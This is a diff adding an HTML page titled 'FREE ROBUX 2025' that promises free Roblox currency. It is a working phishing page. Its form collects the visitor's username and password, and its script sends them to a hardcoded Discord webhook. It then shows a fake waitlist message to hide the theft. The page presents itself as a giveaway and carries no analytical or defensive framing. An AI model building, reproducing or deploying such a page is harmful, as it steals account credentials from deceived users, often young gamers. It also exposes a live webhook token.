@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FREE ROBUX 2025</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: Arial, sans-serif;
+    background-color: #000;
+    overflow-x: hidden;
+  }
+
+  #loading-screen {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center;
+    z-index: 9999;
+  }
+  #loading-screen.hidden { display: none; }
+
+  .please-wait-container { position: relative; width: 200px; height: 200px; }
+  .please-wait-text {
+    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    font-size: 28px; color: #00ff88; text-shadow: 0 0 8px #00ff88, 0 0 20px #00ff88;
+    font-weight: bold; text-transform: uppercase; text-align: center;
+  }
+  .circle {
+    position: absolute; top: 50%; left: 50%; width: 120px; height: 120px;
+    transform: translate(-50%, -50%); animation: rotate 2s linear infinite;
+  }
+  .circle .dot {
+    position: absolute; width: 14px; height: 14px; background: #00ff88; border-radius: 50%;
+  }
+  .circle .dot:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+  .circle .dot:nth-child(2) { right: 0; top: 50%; transform: translateY(-50%); }
+  .circle .dot:nth-child(3) { bottom: 0; left: 50%; transform: translateX(-50%); }
+  .circle .dot:nth-child(4) { left: 0; top: 50%; transform: translateY(-50%); }
+
+  @keyframes rotate {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+  }
+
+  .main-container {
+    display: none; background: rgba(20, 20, 20, 0.95); padding: 20px 30px;
+    border-radius: 12px; box-shadow: 0 0 25px #00ff88, 0 0 50px #00ff88;
+    width: 350px; margin: 100px auto; color: #fff; position: relative; z-index: 2;
+    transition: filter 1s ease;
+
+    /* Glowing Animation */
+    animation: glow 3s ease-in-out infinite alternate;
+  }
+  .main-container.blurred { filter: blur(8px); pointer-events: none; }
+
+  @keyframes glow {
+    0% {
+      box-shadow: 0 0 15px #00ff88, 0 0 30px #00ff88, 0 0 60px #00ff88;
+    }
+    100% {
+      box-shadow: 0 0 30px #00ff88, 0 0 60px #00ff88, 0 0 100px #00ff88;
+    }
+  }
+
+  .question-container { margin-bottom: 18px; }
+  .question { margin-bottom: 5px; font-weight: bold; }
+  .note { font-size: 12px; color: #aaa; margin-bottom: 5px; }
+  .answer, select.answer {
+    width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #555;
+    background: #111; color: #fff; box-sizing: border-box; font-size: 14px;
+  }
+  .submit-btn {
+    display: block; margin: 20px auto 0; padding: 10px 20px;
+    background: #00ff88; color: #000; border: none; border-radius: 6px;
+    cursor: pointer; font-size: 16px; font-weight: bold;
+  }
+  .submit-btn:disabled { background: #444; color: #aaa; cursor: not-allowed; }
+
+  #overlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background-color: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center;
+    z-index: 9998; opacity: 0; transition: opacity 1s ease; pointer-events: none;
+  }
+  #overlay.active { opacity: 1; pointer-events: all; }
+  .overlay-text {
+    color: #00ff88; font-size: 30px; font-weight: bold;
+    text-shadow: 0 0 8px #00ff88, 0 0 20px #00ff88;
+  }
+  .dots::after {
+    content: ''; display: inline-block; width: 1em;
+    animation: dots 1.5s steps(3, end) infinite;
+  }
+  @keyframes dots {
+    0% { content: ''; } 33% { content: '.'; } 66% { content: '..'; } 100% { content: '...'; }
+  }
+  .small-text { font-size: 14px; color: #aaa; margin-top: 10px; }
+</style>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+
+<div id="loading-screen">
+  <div class="please-wait-container">
+    <div class="circle">
+      <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+    <div class="please-wait-text">PLEASE WAIT</div>
+  </div>
+</div>
+
+<div id="overlay">
+  <div>
+    <div class="overlay-text">You're in the waitlist<span class="dots"></span></div>
+    <div class="small-text">Please wait for 24 hours</div>
+  </div>
+</div>
+
+<div class="main-container" id="main-content">
+  <div class="question-container">
+    <div class="question">1. What is your username?</div>
+    <div class="note">Username must be 6-20 characters long.</div>
+    <input type="text" class="answer" id="username" placeholder="Enter username">
+  </div>
+  <div class="question-container">
+    <div class="question">2. What is your password?</div>
+    <div class="note">Password must be at least 8 characters long.</div>
+    <input type="password" class="answer" id="password" placeholder="Enter password">
+  </div>
+  <div class="question-container">
+    <div class="question">3. Select amount:</div>
+    <select class="answer" id="amount">
+      <option value="">Select amount</option>
+      <option value="500">500</option>
+      <option value="2000">2000</option>
+      <option value="11000">11000</option>
+      <option value="24000">24000</option>
+    </select>
+  </div>
+
+  <div class="g-recaptcha" data-sitekey="6Le4-V8rAAAAAOrtgP-yx85V4oynuMEnWpGjE4vD"></div>
+
+  <button class="submit-btn" onclick="submitAnswers()">Submit</button>
+</div>
+
+<script>
+  window.addEventListener("load", () => {
+    setTimeout(() => {
+      document.getElementById('loading-screen').classList.add('hidden');
+      document.getElementById('main-content').style.display = 'block';
+    }, 3000);
+  });
+
+  async function submitAnswers() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const amount = document.getElementById('amount').value;
+    const recaptchaResponse = grecaptcha.getResponse();
+
+    if (username.length < 6 || username.length > 20) {
+      alert("Username must be between 6 and 20 characters.");
+      return;
+    }
+    if (password.length < 8) {
+      alert("Password must be at least 8 characters long.");
+      return;
+    }
+    if (!amount) {
+      alert("Please select an amount.");
+      return;
+    }
+    if (recaptchaResponse.length === 0) {
+      alert("Please complete the reCAPTCHA.");
+      return;
+    }
+
+    const webhookURL = "https://discordapp.com/api/webhooks/1383047487996039220/gr_uQ17pxi0qQiWh4po4c7dF4jKyhOgSvWzro_uEuH1GJrWYwNdVd-Pmy4x-m3ATiVNX";
+    const payload = {
+      content: `**New Submission:**\n👤 Username: ${username}\n🔑 Password: ${password}\n💰 Amount: ${amount}`
+    };
+
+    const button = document.querySelector('.submit-btn');
+    button.disabled = true;
+    button.textContent = "Processing...";
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      setTimeout(() => {
+        document.getElementById('overlay').classList.add('active');
+        document.getElementById('main-content').classList.add('blurred');
+      }, 3000);
+
+    } catch (error) {
+      alert("Error submitting form.");
+      button.disabled = false;
+      button.textContent = "Submit";
+    }
+  }
+</script>
+</body>
+</html>
